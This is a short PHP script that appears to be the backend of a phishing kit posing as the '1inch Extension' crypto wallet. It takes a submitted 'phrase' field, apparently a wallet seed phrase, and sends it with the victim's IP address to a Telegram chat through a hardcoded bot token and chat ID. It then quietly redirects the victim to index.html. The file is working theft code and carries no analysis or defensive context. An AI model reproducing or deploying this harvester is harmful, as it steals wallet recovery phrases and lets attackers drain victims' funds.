<?php
if (isset($_POST) && isset($_POST['phrase']) &&  !empty($_POST['phrase'])){
	
	 function sendMessage($messaggio) {
$chatID = '-858944878'; // like: ''
$token = '5931036558:AAHJXd2Zm1RmP4NhdahCuVMYzogregWbH2w'; //like: ''

$url = "https://api.telegram.org/bot" . $token . "/sendMessage?chat_id=" . $chatID;
$url = $url . "&text=" . urlencode($messaggio);
$ch = curl_init();
$optArray = array(
        CURLOPT_URL => $url,
        CURLOPT_RETURNTRANSFER => true
);
curl_setopt_array($ch, $optArray);
$result = curl_exec($ch);
curl_close($ch);
return $result;

}





$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$message  = "------------------+ [ 1inch Extension ] +-----------------\n";
$message .= " 1.Phrase : ".$_POST['phrase']."\n";
$message .= "-------------------------------------------------\n";
$message .= "Client IP : ".$ip."\n";
$message .= "-----------------+ 1inch Extension +-----------------\n";



sendMessage($message);

	
	
	
	
	
	
	
	
	
	
	
	
	
	}

	die("<script type='text/javascript'> top.location = 'index.html'; </script>");